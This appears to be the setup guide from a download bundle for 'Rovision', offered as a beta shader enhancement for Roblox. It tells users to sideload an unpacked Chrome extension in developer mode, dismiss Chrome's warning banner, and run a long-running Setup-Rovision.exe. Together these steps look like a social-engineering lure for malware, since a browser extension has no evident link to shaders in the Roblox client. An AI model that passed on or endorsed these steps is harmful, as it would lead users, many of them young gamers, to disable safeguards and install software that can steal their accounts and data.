━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ROVISION — Setup Guide (Beta)
  Visual shader enhancement for Roblox
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

For a full walkthrough check the YouTube video linked in Discord.
Follow these 4 steps exactly and you're good.

──────────────────────────────────────────
  STEP 1 — Turn on Developer Mode in Chrome
──────────────────────────────────────────
  1. Open Google Chrome
  2. Type  chrome://extensions  in the address bar and press Enter
  3. Toggle ON "Developer mode" in the top right corner

──────────────────────────────────────────
  STEP 2 — Install the Rovision extension
──────────────────────────────────────────
  1. Open the "Rovision guide" folder (the one you're reading this from)
  2. Drag the "Rovision" folder into the Chrome extensions page and drop it
  3. You should see "Rovision" appear in your extensions list

  ⚠ If Chrome shows a warning banner — click "Keep" or dismiss it.
     This is normal for beta software not yet on the Web Store.

──────────────────────────────────────────
  STEP 3 — Run the installer
──────────────────────────────────────────
  1. Double-click  Setup-Rovision.exe
  2. Click "Install" and let it run — it takes around 7 minutes
  3. Do NOT close it early or the shaders won't compile correctly
  4. Once it says "Installation complete" click Next

──────────────────────────────────────────
  STEP 4 — Launch Roblox
──────────────────────────────────────────
  1. Fully close Roblox if it's already open
  2. Relaunch Roblox normally
  3. Rovision activates automatically — no extra steps needed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Having issues? Join the Discord for support.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
